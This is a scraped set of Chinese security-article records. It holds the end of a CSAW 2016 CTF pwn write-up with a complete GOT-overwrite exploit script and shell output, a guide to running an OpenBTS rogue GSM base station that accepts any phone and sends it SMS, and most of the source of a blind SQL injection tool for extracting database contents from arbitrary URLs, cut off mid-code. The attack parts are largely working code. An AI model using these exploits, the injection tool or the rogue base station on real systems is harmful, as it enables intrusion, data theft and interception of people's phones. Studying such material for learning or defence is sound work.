""\n"")然后读出free函数在libc中的地址,使用偏移计算其他关键函数的地址.   r = recv_until(""Continue? "")    off  = r.find(""Highest player: "") + len(""Highest player: "")    free = struct.unpack(""&lt;Q"", r[off:off + 8])[0] &amp; 0x0000ffffffffffff    print ""[+] Leaking address of free(): "", hex(free)    memset     = free + (0x78890 - 0x817c0)    setvbuf    = free - (0x78890 - 0x67dd0)    system     = free - (0x83a70 - 0x45380)    libc_start = free - (0x83a70 - 0x20740)然后第二次进入游戏,进入 memcpy分支,覆盖got表到bss段    ovfl  = struct.pack(""&lt;Q"", 0x0000000000400D0E)   # free = .text:00400D0E call _puts    ovfl += struct.pack(""&lt;Q"", 0x0000000000400920)   # puts = .text:00400920 start proc near  调到程序的入口,通过调用 libc_statc_main 调用main函数    ovfl += ""A""*8 *5                                # 这些函数没影响    ovfl += struct.pack(""&lt;Q"", system)               # memset = system   将memset函数指针修改为 system函数指针    ovfl += ""B"" * 8 * 2                             #    ovfl += struct.pack(""&lt;Q"", libc_start)           # 修复 libc_statc_main 函数地址,因为后面要通过调用他来调用main函数,从而调用 memset函数.    ovfl += ""C"" * 8 * 3                             #    ovfl += struct.pack(""&lt;Q"", 0x0000000000400B39)   # setvbuf = .text:00400B39 retn   //设为类似nop指令,避免程序出错    ovfl += ""D"" * 8 * 3                             #    ovfl += ""/bin/sh\x00"" + ""E"" * 16                # .data    ovfl += struct.pack(""&lt;Q"", 0x00) + ""F"" * 56      #    ovfl += ""/bin/sh\x00"" + ""G"" * 8                 #  //将 .bss:0000000000602100 的值设为以/bin/sh\x00开头的字符串    ovfl += struct.pack(""&lt;Q"", 0x00000000006020A8)   # .data:006020A8 = &amp;/bin/sh    s.send(ovfl + ""\n"")通过上面的注释,我再来捋一捋整个调用链的流程,在 memcpy 后,程序的 got 表被完全覆盖,之后会马上调用 free函数, 由于 free函数在got 表中的地址被改为 00400D0E ,该地址处的指令为 call _puts ,然后会调用 puts函数, puts函数的地址也被修改,调用puts 函数后会进入到然后他会调用 ___libc_start_main  这个函数地址已经被我们修复了,所以会正常的执行main函数,会执行到memset函数,实际上调用的是system函数,且其参数也被设为了 /bin/sh\x00,我们通过调试试试是否能按exp的预期拿到shell可以看到 memset函数的指针被覆盖为了system函数的地址,并且他的第一个参数所指向的内存也是以 /bin/sh\x00开头,其他got表中的地址也满足预期.单步运行下去可以发现就是按我上面所说的那样执行的.附上exp:#!/usr/bin/env python2# --------------------------------------------------------------------------------------------------import socketimport structimport telnetlibimport string# --------------------------------------------------------------------------------------------------def recv_until(st):  # receive until you encounter a string    ret = """"    while st not in ret:        ret += s.recv(8192)    return ret# --------------------------------------------------------------------------------------------------if __name__ == ""__main__"":    s = socket.create_connection(('127.0.0.1', 10001))    #s = socket.create_connection(('localhost', 7777))    f = s.makefile()                                # associate a file object with socket    recv_until(""What's your name?"")                 # eat banner    s.send( ""A""*128 + ""\n"" )                        # set a big name    recv_until( ""\n"" )    print ""[+] Winning the game once...""    for c in string.ascii_lowercase:                # win the game        s.send( c + ""\n"")        recv_until( ""\n"" )    s.send(' y\n')                                  # change username    raw_input();    # -------------------------------------------------------------------------    # first overflow: Arbitrary read    # -------------------------------------------------------------------------    ovfl  = ""A"" * 128                               # fill name    ovfl += struct.pack(""&lt;Q"", 0x1122334455667788)   # prevsize (heap meta)    ovfl += struct.pack(""&lt;Q"", 0x1122334455667788)   # size (heap meta)    ovfl += struct.pack(""&lt;L"", 0x200)                # score (must be &gt;64)     ovfl += struct.pack(""&lt;L"", 0x128)                # name length    ovfl += struct.pack(""&lt;Q"", 0x0000000000602018)   # address of .got.free()    s.send( ovfl + ""\n"")    r = recv_until(""Continue? "")    # print list(r)    off  = r.find(""Highest player: "") + len(""Highest player: "")    free = struct.unpack(""&lt;Q"", r[off:off + 8])[0] &amp; 0x0000ffffffffffff    print ""[+] Leaking address of free(): "", hex(free)    '''    Offsets from my libc:        1349: 000000000003f510    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5        2230: 0000000000078890   146 FUNC    GLOBAL DEFAULT   13 free@@GLIBC_2.2.5        2116: 0000000000020610   458 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5        844:  00000000000817c0    65 IFUNC   GLOBAL DEFAULT   13 memset@@GLIBC_2.2.5        1880: 0000000000067dd0   518 FUNC    WEAK   DEFAULT   13 setvbuf@@GLIBC_2.2.5    '''    system     = free - (0x78890 - 0x3f510)    libc_start = free - (0x78890 - 0x20610)    memset     = free + (0x78890 - 0x817c0)    setvbuf    = free - (0x78890 - 0x67dd0)    '''    Offsets from libc-2.23.so:        1351: 0000000000045380    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5+        2232: 0000000000083a70   460 FUNC    GLOBAL DEFAULT   13 free@@GLIBC_2.2.5        2118: 0000000000020740   458 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5    '''    system     = free - (0x83a70 - 0x45380)    libc_start = free - (0x83a70 - 0x20740)         s.send(' y\n')                                  # play the game again    recv_until(""\n"")    for c in string.ascii_lowercase:                # win the game again        s.send( c + ""\n"")        print recv_until( ""\n"" ),    print    s.send(' y\n')                                  # change name again    print ""[+] free() at"", hex(free)    print ""[+] system() at"", hex(system)    print ""[+] __libc_start_main() at"", hex(libc_start)    print     print ""[+] Overwriting GOT...""    # -------------------------------------------------------------------------    # second overflow: Arbitrary write to GOT    # -------------------------------------------------------------------------    # 0x400A2E contains a newline    #    # control flow:    #   1. Overflow in memcpy() at 0x400EC4    #   2. Hijack control during call to free() at 0400ED0    #   3. go to .text:00400D0E call _puts    #   4. go to .text:00400920 start proc near    #   5. go to main()    #    #   SOLUTION A:    #       6. call setvbuf()  (actually system)    #    #   SOLUTION B:    #       6. call setvbuf() (make it idle; point to retn)    #       7. call memset() (actuall system)    #    # Payload contains both solutions, but only one is used.    #     ovfl  = struct.pack(""&lt;Q"", 0x0000000000400D0E)   # free = .text:00400D0E call _puts    ovfl += struct.pack(""&lt;Q"", 0x0000000000400920)   # puts = .text:00400920 start proc near    ovfl += ""A""*8 *5                                # ignore these entries    ovfl += struct.pack(""&lt;Q"", system)               # memset = system    ovfl += ""B"" * 8 * 2                             #    ovfl += struct.pack(""&lt;Q"", libc_start)           # recover __libc_start_main    ovfl += ""C"" * 8 * 3                             #    ovfl += struct.pack(""&lt;Q"", 0x0000000000400B39)   # setvbuf = .text:00400B39 retn    ovfl += ""D"" * 8 * 3                             #    ovfl += ""/bin/sh\x00"" + ""E"" * 16                # .data    ovfl += struct.pack(""&lt;Q"", 0x00) + ""F"" * 56      #    ovfl += ""/bin/sh\x00"" + ""G"" * 8                 #    ovfl += struct.pack(""&lt;Q"", 0x00000000006020A8)   # .data:006020A8 = &amp;/bin/sh    s.send(ovfl + ""\n"")    # -------------------------------------------------------------------------    # get shell    # ------------------------------------------------------------------------    s.send( '`;')                                   # fix backtick problem    print '[+] Opening Shell...'    t = telnetlib.Telnet()                          # try to open shell    t.sock = s    t.interact()# --------------------------------------------------------------------------------------------------'''root@eyh:~/ctf/csaw_16# ./hungman_expl.py [+] Winning the game once...[+] Leaking address of free():  0x7f9776b85a70___a__________________________________________________a___________________________________________a__a______________________________a_____________a______________________________________________a_______________________________________________________________________________________________a________a___________________b______________________________a___________________________________________a__a______b_______________________a__________bb_a___b____________________b___b_________________abb_____b_______b_____b_______________________________________b________b______________b_________ab_______a_c___c__c_c________b______________________________a______c_____c______________________c_______a__a______b_______________________a______cc__bb_a___b_____c______________b___b_________________abb_____b____c__b_____b_______________________________________b__c_____b______________b_________ab_______a_c___c__c_c____d___b_________________________dd___a_____dc___d_c_____________________dc_______a_da______b____d__________________a______cc__bb_a___b_____c______________b___b_________________abb_____b____c__b____db_______________________________________b__c_____b______________b_________ab_______a_c___c__c_c____d___b_________________________dd_e_a_____dce__d_c____________e________dc_______a_da_e____b____d__________________a______cc__bb_a___b_____c______________b___b_________________abb_____b____c__b____db_______________________________________b__c_____b______________b_________ab_______a_c___c__c_c____d__fb______f________________f_dd_e_a_____dce__d_c_____f____f_e________dc_______a_da_e____b____d_______________f__a____f_cc__bb_a___b_____c______________b___b___f_____________abb_____b_f__cf_b_f__db____f___________________ff_____________b__c_____b______________b_________ab_______a_c___c__c_c____d__fb___gg_f_________g______f_dd_e_a_____dce__d_c_____f_gg_f_e________dc_____g_a_da_e____b____d_____g_________f__a____f_cc__bb_a___b_____c______________b_ggb___f__________g__abb_____b_f__cf_b_f__db____f______________g____ff_____________b__c_____b____________g_b______g__ab_______a_c___c__c_c____d__fb___gg_f_________g__h__hf_dd_e_a_____dce__d_c_____f_gg_f_e_h______dc_____g_a_da_e____b____d_____g_________f__a____f_cc__bb_a_h_b_____c______________b_ggb___f__________g__abb____hb_f__cf_b_f__db___hf______________g_h__ff_h___________b__c____hb___h_______hg_b______g__ab_______a_c___c__c_c____d__fb___gg_f_i_______g__h__hf_ddie_a___i_dce__d_c___i_f_gg_f_e_h______dc_____g_a_da_e__i_b_i__d_i_i_g_________f__a____f_cc__bb_a_h_b____ic____________i_b_ggb___f_______i__g__abb____hb_fi_cf_b_fi_db___hf______________g_h__ff_h______i___ib__c__i_hb___h_i_____hg_b___i__g_iab_i_____a_c___c__c_c____d__fbjjjggjfji_______g__h__hf_ddie_a___i_dce__d_cj__i_f_gg_f_e_h______dc_____gja_da_e__ijb_i__d_i_i_g_________f__a____f_cc_jbb_a_h_b____ic____________i_b_ggb___f_______i__g__abb_j__hb_fijcf_b_fi_db___hf______________g_h__ff_h__jj__i___ib__c__i_hb__jh_i_____hg_b___i__g_iab_i_____a_c___c__c_c___kd__fbjjjggjfji_______g__h__hf_ddie_a___i_dce__dkcj__i_f_gg_f_e_h__k___dc_____gja_dake__ijb_i__d_i_i_g_________f__a____f_cc_jbb_a_hkb_k__ic____________i_b_ggb___f___k___i__g__abb_j__hb_fijcf_b_fi_db___hfk_____k___k___g_h__ff_h__jj__i___ib__c__i_hb__jh_i_____hg_b___i__g_iab_i_____a_c___c__c_c___kd_lfbjjjggjfji_______g__h__hf_ddie_a___i_dce__dkcjl_i_f_gg_f_e_h__k___dc_____gja_dakel_ijb_i__d_i_i_g____l____f__a____f_cc_jbb_a_hkb_k__icl__l_l______i_b_ggb___f___k___i__g_labb_j__hb_fijcf_b_fi_db___hfk____lk___k___g_h__ff_h__jj__i___ib_lc__i_hb__jh_i_____hg_b___i_lgliab_i_____a_c___c__c_c___kd_lfbjjjggjfji_______g__h__hfmddie_a___i_dce__dkcjl_i_fmggmf_e_h__k___dc_____gja_dakel_ijb_i__d_i_i_g___ml_m__f__a____f_ccmjbb_a_hkb_k__icl__l_l______i_b_ggbm__f___k___i__g_labb_j__hb_fijcf_b_fi_db___hfk____lkm__k___g_h__ff_h__jj__i___ib_lc__i_hb__jh_i_____hg_b___i_lgliab_imm___a_c___c__c_c___kd_lfbjjjggjfji_______g_nh__hfmddie_ann_i_dce__dkcjlni_fmggmf_e_h__k___dc____ngja_dakelnijb_i__d_i_i_g___mlnm__fn_a____f_ccmjbb_a_hkb_k__icl_nl_l______i_b_ggbm__f___k___i__g_labb_j__hb_fijcf_b_fi_db___hfkn_n_lkm__k___g_h__ff_h__jj__in__ib_lc__i_hb__jh_i_____hg_b___i_lgliab_imm__oa_c___c__c_c___kd_lfbjjjggjfji_______g_nh__hfmddie_ann_iodce__dkcjlniofmggmf_e_h__k___dc__o_ngja_dakelnijb_i__d_i_iog___mlnm__fn_a___of_ccmjbboa_hkb_k__icl_nl_l______i_boggbm__f___k___io_g_labb_j__hb_fijcf_b_fi_db___hfkn_n_lkmo_k___g_h__ff_ho_jj__in__ib_lc__i_hb__jh_i_____hg_b___i_lgliaboimm__oapc___c__c_c___kd_lfbjjjggjfji_______g_nh__hfmddie_annpiodce__dkcjlniofmggmf_e_h__k__pdc__o_ngjapdakelnijbpi_pd_i_iog___mlnm__fn_a___of_ccmjbboa_hkb_k__icl_nl_l___p__i_boggbmp_f___k___io_g_labb_j__hb_fijcf_b_fi_db___hfkn_n_lkmo_k___g_h__ff_ho_jj__in__ib_lc__i_hb__jh_i_____hg_b___i_lgliaboimm_qoapcq_qc__c_c___kd_lfbjjjggjfji_______gqnh__hfmddie_annpiodce_qdkcjlniofmggmf_e_h_qk__pdc__o_ngjapdakelnijbpi_pd_i_iog___mlnm__fn_a_qqof_ccmjbboa_hkb_k__icl_nl_l___p_qi_boggbmp_fqq_k___io_g_labb_jq_hb_fijcf_b_fi_db___hfkn_n_lkmo_k___g_h__ff_hoqjj__in__ib_lc__i_hb__jh_i_____hg_b__qi_lgliaboimm_qoapcq_qc__c_c___kd_lfbjjjggjfji__rr___gqnhr_hfmddie_annpiodce_qdkcjlniofmggmf_e_h_qk__pdc__o_ngjapdakelnijbpi_pd_i_iogr_rmlnm_rfn_a_qqof_ccmjbboa_hkb_k__icl_nl_l___p_qi_boggbmp_fqq_k___io_grlabb_jq_hb_fijcfrb_fi_db___hfkn_n_lkmo_k__rg_h__ff_hoqjj__in_rib_lc__i_hb__jh_i____rhg_br_qi_lgliaboimm_qoapcq_qc__c_c___kd_lfbjjjggjfji__rr___gqnhr_hfmddie_annpiodce_qdkcjlniofmggmf_e_h_qk__pdc__o_ngjapdakelnijbpi_pdsi_iogr_rmlnm_rfn_asqqof_ccmjbboa_hkb_ks_icl_nl_l___p_qisboggbmpsfqq_k___io_grlabb_jq_hb_fijcfrb_fi_db_s_hfkn_n_lkmosk__rg_h__ffshoqjj_sin_rib_lc__i_hb__jh_i_s__rhg_brsqi_lgliaboimm_qoapcq_qc__c_c___kd_lfbjjjggjfji__rrt__gqnhr_hfmddie_annpiodce_qdkcjlniofmggmf_eth_qkt_pdc__o_ngjapdakelnijbpi_pdsi_iogr_rmlnm_rfn_asqqof_ccmjbboa_hkb_ks_icl_nl_l___p_qisboggbmpsfqq_k___io_grlabb_jq_hb_fijcfrb_fi_db_s_hfkntn_lkmosk__rg_h__ffshoqjj_sin_rib_lc__i_hb__jh_i_s__rhg_brsqitlgliaboimm_qoapcq_qcu_c_c___kd_lfbjjjggjfji__rrt__gqnhruhfmddie_annpiodceuqdkcjlniofmggmf_eth_qktupdc__oungjapdakelnijbpiupdsi_iogr_rmlnm_rfn_asqqof_ccmjbboa_hkb_ksuicl_nl_l___puqisboggbmpsfqq_k_u_io_grlabb_jq_hb_fijcfrb_fi_db_s_hfkntn_lkmosku_rg_h__ffshoqjjusin_rib_lc__iuhb__jhuiusuurhgubrsqitlgliaboimm_qoapcqvqcu_cvcv__kd_lfbjjjggjfjivvrrt__gqnhruhfmddie_annpiodceuqdkcjlniofmggmfveth_qktupdc__oungjapdakelnijbpiupdsi_iogr_rmlnm_rfn_asqqof_ccmjbboa_hkb_ksuicl_nl_l___puqisboggbmpsfqqvkvu_io_grlabb_jq_hbvfijcfrbvfi_db_s_hfkntnvlkmoskuvrg_h_vffshoqjjusin_rib_lc__iuhb__jhuiusuurhgubrsqitlgliaboimm_qoapcqvqcu_cvcv__kd_lfbjjjggjfjivvrrt__gqnhruhfmddiewannpiodceuqdkcjlniofmggmfvethwqktupdc__oungjapdakelnijbpiupdsi_iogrwrmlnm_rfnwasqqof_ccmjbboa_hkb_ksuicl_nl_lw__puqisboggbmpsfqqvkvu_io_grlabbwjq_hbvfijcfrbvfi_db_s_hfkntnvlkmoskuvrgwhwvffshoqjjusin_rib_lc__iuhb__jhuiusuurhgubrsqitlgliaboimm_qoapcqvqcu_cvcvx_kd_lfbjjjggjfjivvrrtxxgqnhruhfmddiewannpiodceuqdkcjlniofmggmfvethwqktupdcx_oungjapdakelnijbpiupdsi_iogrwrmlnm_rfnwasqqof_ccmjbboa_hkbxksuiclxnl_lwx_puqisboggbmpsfqqvkvu_ioxgrlabbwjq_hbvfijcfrbvfi_db_sxhfkntnvlkmoskuvrgwhwvffshoqjjusinxrib_lc_xiuhb_xjhuiusuurhgubrsqitlgliaboimmyqoapcqvqcu_cvcvxykdylfbjjjggjfjivvrrtxxgqnhruhfmddiewannpiodceuqdkcjlniofmggmfvethwqktupdcx_oungjapdakelnijbpiupdsi_iogrwrmlnmyrfnwasqqofyccmjbboa_hkbxksuiclxnlylwxypuqisboggbmpsfqqvkvuyioxgrlabbwjqyhbvfijcfrbvfi_db_sxhfkntnvlkmoskuvrgwhwvffshoqjjusinxribylc_xiuhb_xjhuiusuurhgubrsqitlgliaboimmHigh score! change name?[+] free() at 0x7f9776b85a70[+] system() at 0x7f9776b47380[+] __libc_start_main() at 0x7f9776b22740[+] Overwriting GOT...[+] Opening Shell...    id        uid=1000(hungman) gid=1000(hungman) groups=1000(hungman)    ls -la        total 36        drwxr-x---  2 root hungman  4096 Sep 16 21:31 .        drwxr-xr-x 10 root root     4096 Sep 16 21:31 ..        -rw-r--r--  1 root hungman   220 Sep 16 21:31 .bash_logout        -rw-r--r--  1 root hungman  3771 Sep 16 21:31 .bashrc        -rw-r--r--  1 root hungman   655 Sep 16 21:31 .profile        -rw-rw-r--  1 root root       41 Sep 16 21:13 flag.txt        -rwxrwxr-x  1 root root    10464 Sep 16 21:13 hungman    cat flag.txt        flag{this_looks_like_its_a_well_hungman}    exit*** Connection closed by remote host ***root@eyh:~/ctf/csaw_16# '''# --------------------------------------------------------------------------------------------------总结分析和学习这个pwn时,发现1. 在逆向时不能太相信ida 的f5插件,当f5反编译出来的代码逻辑比较奇怪时,要去看汇编代码.2. 同时要多调试,很多看似复杂的东西,调试过去就能够很容易的理解.3. 这个漏洞的利用手法不错,通过覆盖got表形成了一种类似于 rop的调用链最终实现了漏洞利用.","2016-11-14 17:57:19","CTF专题","一道有趣的CTF PWN题","http://nsoad.com/Article/CTF/20161114/771.html"
"5ccbfa1b4f2f0a0a7a69c011","如何从不联网的电脑中盗取1KB名叫《新建文本文档》内容为 test 的txt文件？实际上这个是FreeBuf小酒馆里面的某个问题，当然，回答也很喜感…..","dalamar","* 本文原创作者：diulei，本文属FreeBuf原创奖励计划，未经许可禁止转载前提介绍：上次我写了osmocombb配合c118嗅探短信的文章，很多朋友留言让我写搭建openbts的，对于openbts其实很简单，官方文档就可以，主要是很多的环境依赖对于新手来说不好安装。所以今天我就出一个详细的openbts搭建基站。安装所需：ubuntu12.0.4(系统)openbts2.8osmocomlibosmo-dsp     安装步骤：一、安装libosmo-dsp分之：对于osmocom的libosmo-dsp分之，首先需要先安装osmocom，对于osmocom我之前写的文章很详细的写到了http://www.freebuf.com/sectool/107755.html    在这篇文章的“六：下载并编译osmocomBB”，请安装下面的步骤来安装下载所需要的$ git clone git://git.osmocom.org/libosmocore.git$ git clone git://git.osmocom.org/osmocom-bb.git$ git clone git://git.osmocom.org/libosmo-dsp.git    (openbts要用的)在安装libosmocore执行./configure 的时候很多人会遇到 No package ‘talloc’ found 这种错误，因为找不到talloc，下面是解决办法$ wget https://www.samba.org/ftp/talloc/talloc-2.1.7.tar.gz$ tar -zxvf talloc-2.1.7.tar.gz$ cd talloc-2.1.7/$ ./configure$ make$ sudo make install安装libosmocore          $ cd libosmocore/$ autoreconf -i$ ./configure $ make$ sudo make install$ cd ..         安装libosmo-dsp    $ cd libosmo-dsp/$ autoreconf -i$ ./configure $ make $ sudo make install$ cd..        安装osmocom-bb  $ cd osmocom-bb/$ git checkout sylvain/testing $ cd src$ make HOST_layer23_CONFARGS=--enable-transceiver  执行下面命令，刷入c118（如果刷入失败。。请检查你的c118是否接好）$ sudo ./osmocon -p /dev/ttyUSB0 -m c123xor ../../target/firmware/board/compal_e88/trx.compalram.bin 二、下载安装openbts下面所有操作都在root权限下所以获取root权限$ su下载openbts2.8$ svn co http://wush.net/svn/range/software/public（如果提示没有svn的话现在安装一下svn）$ apt-get install subversion（安装svn）安装需要的依赖（很多人安装openbts各种错误就是因为环境依赖的问题）$ sudo apt-get install autoconf libtool libosip2-dev libortp-dev libusb-1.0-0-dev g++ sqlite3 libsqlite3-dev erlang libreadline6-dev libncurses5-dev安装openbts(进入刚才下载openbts的目录里面有一个public目录)$ cd public$ cd a53/trunk$ make install$ cd openbts/trunk$ autoreconf -i$ ./configure$ make$ cd apps$ ln -s ../TransceiverRAD1/transceiver .$ mkdir /etc/OpenBTS（在etc下面创建目录存放openbts的配置文件）$ cd ..$ sqlite3 -init ./apps/OpenBTS.example.sql /etc/OpenBTS/OpenBTS.db "".quit""（openbts的配置文件）$ sudo mkdir -p /var/lib/asterisk/sqlite3dir$ sqlite3 /etc/OpenBTS/OpenBTS.db .dump（查看数据库文件是否成功）如果成功显示配置文件的内容那就成功了安装sipauthserve（SIP 鉴权服务）然后我们在回到public目录安装sipauthserve$ cd subscriberRegistry/trunk$ make$ sudo sqlite3 -init subscriberRegistry.example.sql /etc/OpenBTS/sipauthserve.db "".quit""（sipauthserve的配置文件同样在刚才openbts配置文件的目录）安装smqueue（短信服务）回到public目录$ cd smqueue/trunk$ autoreconf -i$ ./configure$ make$ sudo sqlite3 -init smqueue/smqueue.example.sql /etc/OpenBTS/smqueue.db "".quit""（同样的smqueue配置文件）好了现在全部都安装好了，咱们来开始启动openbts第一步先刷入c118（注意下面的操作依然是root权限）$ osmocom-bb/src/host/osmocon/osmocon -p /dev/ttyUSB0 -m c123xor ../../target/firmware/board/compal_e88/trx.compalram.bin 第二步利用c118做openbts的收发器，ARFCN是基站信息，你可以扫描附近的基站，利用cell可以先扫描基站信息，找个最强的    $ osmocom-bb/src/host/layer23/src/transceiver/transceiver ARFCN第三步启动openbts（新手朋友注意。这里是打开4个新的终端。。不是在一个终端里面执行） $ smqueue/trunk/smqueue/smqueue$ subscriberRegistry/trunk/sipauthserve$ openbts/trunk/apps/OpenBTS$ openbts/trunk/apps/OpenBTSCLI启动成功后，咱们还有一步就是配置OpenBTSCLI（修改openbts的配置，这一步很重要）启动OpenBTSCLI后，我们需要修改几处配置   $ config（这条命令可以查看你的配置文件）https://1.bp.blogspot.com/-LiP6wODk3Dg/V381LDCynpI/AAAAAAAAAD4/c4pFA3rgdagmcitTcrm3N_ojicTetI7bACLcB/s1600/H%2529DXTU%257D%2529E%2529RHOXDBV%252875OI7.jpg$ config Control.LUR.OpenRegistration .*（修改Control.LUR.OpenRegistration可以让任何的手机加入基站）$ config GSM.Radio.C0 ARFCN（这里的ARFCN是  transceiver 监视的基站信息）$ config GSM.Identity.MCC 001$ config GSM.Identity.MNC 01（MCC MNC 移动国家码，这里用001 01这是测试网络）最后终于可以用手机搜索并连接bts你手机应该会看见Test PLMH 1-1（如果看不见就多试几次。。或者换基站。。毕竟是c118最激动的时候到了测试短信看到OpenBTSCLI终端窗口执行$ tmsis（查看链接到基站的ismi）$  sendsms TMSIS number messege（TMSIS就是刚才tmsis查看到的ismi，number就是你要发送过去的电话号码，messege是短信内容）文档参考：http://gsmsuperben.blogspot.my/2016/07/osmocomc118openbts-send-sms.html* 本文原创作者：diulei，本文属FreeBuf原创奖励计划，未经许可禁止转载","2016-09-19 14:18:09","无线安全","如何利用c118搭建基站发短信实验？","http://nsoad.com/Article/wifi/20160919/416.html"
"5ccbfa1c4f2f0a0a7a69c012","文章主要是为了帮助刚刚踏入安全界的新手们学习sql注入知识，自己手写一个注入工具能让你更好的熟悉注入的原理和过程","黑戈爾","*本文原创作者：黑戈爾，本文属FreeBuf原创奖励计划，未经许可禁止转载0×01 前言我想在FreeBuf上出没的人一般都是安全行业的，或者说是安全方面的爱好者，所以大家对sql注入应该都比较了解，反正我刚入门的时候就是学的这些：sql注入、xss之类的。sql注入从出现到现在也十多年了，但是一直都在owasp top10中有一席之地，原因之一就是sql注入的门槛低危害高，攻击者不需要带计算机知识、网络知识有什么太深的了解，甚至是都不需要了解，只要知道几条sql语句和那几种数据库的不同结构就可以发起攻击，而造成的伤害确实非常非常高的。大型的网站已经很少有sql注入漏洞了，但是对于那些开发和防护都不太过关的小网站却还经常会存在sql注入漏洞，毕竟百密一疏，只要有一个注入点就可以遍历整个数据库。我本人对sql注入技术其实不是很感兴趣，而且我sql注入的水平也比较的low，这篇文章呢主要目的是帮助刚刚踏入安全界或者说是想要从事安全工作的新手们学习sql注入知识而写的，自己手写一个注入工具能让你更好的熟悉注入的原理和过程，这篇文中文字将比较少，代码占大部分，代码我也大多加了注释比较容易看懂。0×02 注入工具的运行环境运行环境：windows7/8/10 +python 2.7存在sql注入漏洞环境：PHP+mysqlsql注入类型：盲注主要的思路：判断url有无注入漏洞→若有漏洞用户决定是否继续注入→猜解数据库名长度→猜解数据库名→猜解数据库中表个数→猜解每个表的长度与表名→根据表名查看表中内容0×03 代码不足之处1. 在这里我只写了对于mysql的盲注利用工具，所以对mssql、oracle等其他数据库基本是不好使，本来我是想把这两个也加进去的，但是我精力有限就没有继续完善2. 这个工具呢实际应用作用不大，适用范围比较小，只适合新手学习用，原因就是因为后面的注入语句没有跟前面的判断语句做动态的关联，而是直接写死的，这就造成了有的环境下不好用，我是没精力改写了，喜欢玩的就下面这个段代码改改，就能适应更多环境更多种类的数据库了。3. 这个工具呢只能应用于GET提交数据的网站，post的原理一样，只是还没写上呢……0×04 代码详情#!/usr/bin/python#-*- coding: UTF-8 -*-import httplibimport urllibdef sqlscan():    while 1:        ture=('+and+5=5',' and 2=2')#这里是判断有无注入的语句        false=('+and+5=6',' and 2=3')        url=raw_input(""输入源url："")        if url.find('http://')!= -1: #看有没有http://有的话删除            url=url.lstrip('http://') #删除http://                a=url.find('/') #找/分割主机和资源名        print a        host=url[:a] #/前的是主机名        path=url[a:]   #后面是资源名                conn=httplib.HTTPConnection(host,80) #与主机建立一个http连接        in_p=path.find('$') #查找注入点的位置                i=0        len_x=0        while (len_x&lt;10)and(i&lt;len(ture)):            #path_ture=path[:in_p-1]+ture[i]+path[in_p:] #组合注入语句            #path_false=path[:in_p-1]+false[i]+path[in_p:] #组合错误的注入语句            path_ture=path.replace('$',urllib.quote(ture[i])) #用判断注入的语句替换$            path_false=path.replace('$',urllib.quote(false[i]))                        conn=httplib.HTTPConnection(host,80)            conn.request('GET',path_ture) #以get方式请求            res_ture=conn.getresponse()              len_ture=len(res_ture.read()) #计算返回信息的长度            print ""len_ture:"",len_ture            #body_ture=res_ture.read()            #print body_ture                        conn=httplib.HTTPConnection(host,80)                conn.request('GET',path_false)#同上            res_false=conn.getresponse()            len_false=len(res_false.read())            print ""len_false:"",len_false            len_x=abs(len_ture-len_false)            i+=1            if len_x&gt;10:                s1= ""$处存在sql注入漏洞""                print s1.decode('utf-8')                d=raw_input(""是否尝试注入Y/N: "")                if d=='N':                    break                elif d=='Y':                    sqlin(host,path,conn,len_ture)                        if len_x&lt;=10:            s= ""貌似没有sql注入漏洞""            print s.decode('utf-8')            continue                        def sqlin(host,path,conn,len_ture):    num=0        while num &lt; 50:        sqli_database_len=' and length(database())&gt;'+str(num)#组合注入语句，猜数据库名字长度，改进的话应该在这把注入语句                                                             #跟前面的判断注入语句关联        path_sqli=path.replace('$',urllib.quote(sqli_database_len)) #组合新的path        #print path_sqli        conn.request('GET',path_sqli) #获取数据        res=conn.getresponse() #获取数据        res_len=len(res.read()) #获取数据长度        diff=abs(len_ture-res_len) #对比长度        #print diff        if diff &gt; 10: #条件长度差大于10即认为不同            database_len=num            print ""数据库名长度："",database_len            break                num+=1    '''    num_1=1    database_name=[]    while num_1&lt;=database_len:        for i in range(33,127):            sqli_database_name=' and ord(mid(database(),'+str(num_1)+',1))&gt;'+str(i)            path_sqli=path.replace('$',urllib.quote(sqli_database_name))            conn.request('GET',path_sqli) #获取数据            res=conn.getresponse() #获取数据            res_len=len(res.read()) #获取数据长度            diff=abs(len_ture-res_len) #对比长度            if diff &gt; 10: #条件长度差大于10即认为不同                database_name.append(chr(i))                break        num_1+=1        '''    num_1=1    database_name=[]    while num_1&lt;=database_len:#猜数据库名        min_num=33        max_num=127                while 1:#二分法猜字段            num_2=(min_num+max_num)/2            sqli_database_name=' and ord(mid(database(),'+str(num_1)+',1))&gt;'+str(num_2)            path_sqli=path.replace('$',urllib.quote(sqli_database_name))            conn.request('GET',path_sqli) #获取数据            res=conn.getresponse() #获取数据            res_len=len(res.read()) #获取数据长度            diff=abs(len_ture-res_len) #对比长度            if diff&lt;10:                min_num=num_2            else:                max_num=num_2            if max_num-min_num==1:                database_name.append(chr(max_num))                break            #print 'min_num:',min_num            #print 'max_num:',max_num        num_1+=1                                    database_name_1=( ''.join(database_name))    print ""数据库名："",database_name_1    num_3=0        while num_3 &lt; 100:        sqli_database_len=' and (select count(table_name) from information_schema.tables where table_schema=database())&gt;'+str(num_3)#组合注入语句，猜数据库表个数        path_sqli=path.replace('$',urllib.quote(sqli_database_len)) #组合新的path        #print path_sqli        conn.request('GET',path_sqli) #获取数据        res=conn.getresponse() #获取数据        res_len=len(res.read()) #获取数据长度        diff=abs(len_ture-res_len) #对比长度        #print diff        if diff &gt; 10: #条件长度差大于10即认为不正确            database_len=num_3            print ""数据库中表的个数："",database_len            break                num_3+=1            #'''    num_4=0    while num_4&lt;database_len:                num_5=0        while num_5&lt;50:#猜解表名长度                        sqli_database_len=' and (select length(table_name) from information_schema.tables where table_schema=database() limit '+str(num_4)+',1)&gt;'+str(num_5)#组合注入语句，猜数据库表个数            path_sqli=path.replace('$',urllib.quote(sqli_database_len)) #组合新的path                        conn.request('GET',path_sqli) #获取数据            res=conn.getresponse() #获取数据            res_len=len(res.read()) #获取数据长度            diff=abs(len_ture-res_len) #对比长度                        if diff &gt; 10: #条件长度差小于10即认为正确                table_NO=num_4+1                table_len=num_5                #print ""数据库中第"",table_NO,""个表的长度："",table_len                break                        num_5+=1                num_6=1        table_name=[]        tables=[]        while num_6&lt;=table_len:#猜解数据库表名            min_num=33            max_num=127                        while 1:#二分法猜字段，二分法比一个一个猜快很多                num_7=(min_num+max_num)/2                sqli_database_name=' and ord(mid((select 